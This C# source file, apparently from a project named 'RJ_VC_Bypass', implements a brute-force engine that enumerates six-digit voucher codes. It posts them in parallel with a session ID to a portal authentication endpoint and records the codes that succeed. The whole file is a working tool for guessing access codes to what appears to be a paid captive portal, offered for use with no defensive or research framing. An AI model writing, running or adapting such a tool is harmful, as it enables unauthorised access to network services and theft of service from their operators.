using System.Collections.Concurrent;

namespace RJ_VC_Bypass;

/// <summary>
/// Event args for brute force progress
/// </summary>
public class BruteForceProgressEventArgs : EventArgs
{
    public int TestedCount { get; set; }
    public int TotalKeys { get; set; }
    public string CurrentCode { get; set; } = string.Empty;
    public long Speed { get; set; }
    public int FoundCount { get; set; }
}

/// <summary>
/// Brute force engine for voucher code testing
/// </summary>
public class BruteForceEngine
{
    private volatile bool _isRunning;
    private CancellationTokenSource? _cancellationTokenSource;
    private readonly HttpHelper _httpHelper;
    private readonly ConcurrentBag<string> _foundKeys = new();
    private readonly ConcurrentQueue<string> _logQueue = new();

    public event EventHandler<BruteForceProgressEventArgs>? ProgressUpdate;
    public event EventHandler<string>? LogMessage;
    public event EventHandler<string>? KeyFound;

    private int _testedCount;
    private int _totalKeys;
    private long _startTime;
    private string _currentCode = "Waiting...";
    private string? _sessionId;

    public bool IsRunning => _isRunning;
    public IReadOnlyCollection<string> FoundKeys => _foundKeys.ToList().AsReadOnly();

    public BruteForceEngine()
    {
        _httpHelper = new HttpHelper();
    }

    /// <summary>
    /// Start brute force attack
    /// </summary>
    public void StartAttack(int startCode, int endCode, string sessionId)
    {
        if (_isRunning) return;

        _sessionId = sessionId;
        _isRunning = true;
        _testedCount = 0;
        _foundKeys.Clear();
        _cancellationTokenSource = new CancellationTokenSource();
        _startTime = DateTimeOffset.Now.ToUnixTimeMilliseconds();

        _totalKeys = (endCode - startCode) + 1;

        // Generate all codes
        var codes = new List<string>();
        for (int i = startCode; i <= endCode; i++)
        {
            codes.Add(i.ToString("D6"));
        }

        // Shuffle for randomness
        Shuffle(codes);

        SendLog("> Starting brute force attack...");
        SendLog($"> Testing {codes.Count} codes with SID: {sessionId}");

        _ = Task.Run(() => RunBruteForce(codes, _cancellationTokenSource.Token));
    }

    /// <summary>
    /// Stop the attack
    /// </summary>
    public void Stop()
    {
        _isRunning = false;
        _cancellationTokenSource?.Cancel();
        _cancellationTokenSource?.Dispose();
        _cancellationTokenSource = null;

        SendLog("> 🛑 Attack Stopped by User");
    }

    /// <summary>
    /// Main brute force loop
    /// </summary>
    private async Task RunBruteForce(List<string> codes, CancellationToken ct)
    {
        try
        {
            // Use parallel tasks for speed
            var options = new ParallelOptions
            {
                CancellationToken = ct,
                MaxDegreeOfParallelism = 20
            };

            await Parallel.ForEachAsync(codes, options, async (code, token) =>
            {
                if (!_isRunning || token.IsCancellationRequested)
                    return;

                await TestCode(code, token);
            });
        }
        catch (OperationCanceledException)
        {
            SendLog("> Attack cancelled");
        }
        catch (Exception ex)
        {
            SendLog($"> Error: {ex.Message}");
        }
    }

    /// <summary>
    /// Test a single code
    /// </summary>
    private async Task TestCode(string code, CancellationToken ct)
    {
        _currentCode = code;

        try
        {
            string json = $"{{\"accessCode\":\"{code}\",\"sessionId\":\"{_sessionId}\",\"apiVersion\":1}}";

            var response = await _httpHelper.PostJsonAsync(AppConfig.PORTAL_AUTH_URL, json);
            string content = await response.Content.ReadAsStringAsync();

            if (response.IsSuccessStatusCode && content.Contains("\"success\":true") || content.Contains("\"success\": true"))
            {
                _foundKeys.Add(code);
                SendLog($"> 🎉 SUCCESS - KEY FOUND: {code}");
                KeyFound?.Invoke(this, code);
            }
        }
        catch (Exception ex)
        {
            // Ignore individual test failures
        }

        Interlocked.Increment(ref _testedCount);
    }

    /// <summary>
    /// Update progress
    /// </summary>
    private void UpdateProgress()
    {
        var elapsed = (DateTimeOffset.Now.ToUnixTimeMilliseconds() - _startTime) / 1000;
        long speed = elapsed > 0 ? _testedCount / elapsed : 0;

        ProgressUpdate?.Invoke(this, new BruteForceProgressEventArgs
        {
            TestedCount = _testedCount,
            TotalKeys = _totalKeys,
            CurrentCode = _currentCode,
            Speed = speed,
            FoundCount = _foundKeys.Count
        });
    }

    /// <summary>
    /// Send log message
    /// </summary>
    private void SendLog(string message)
    {
        LogMessage?.Invoke(this, message);
    }

    /// <summary>
    /// Shuffle list
    /// </summary>
    private static void Shuffle<T>(List<T> list)
    {
        var random = new Random();
        int n = list.Count;
        while (n > 1)
        {
            n--;
            int k = random.Next(n + 1);
            T value = list[k];
            list[k] = list[n];
            list[n] = value;
        }
    }

    /// <summary>
    /// Start progress updater
    /// </summary>
    public void StartProgressUpdater()
    {
        Task.Run(async () =>
        {
            while (_isRunning)
            {
                UpdateProgress();
                await Task.Delay(80);
            }
        });
    }
}
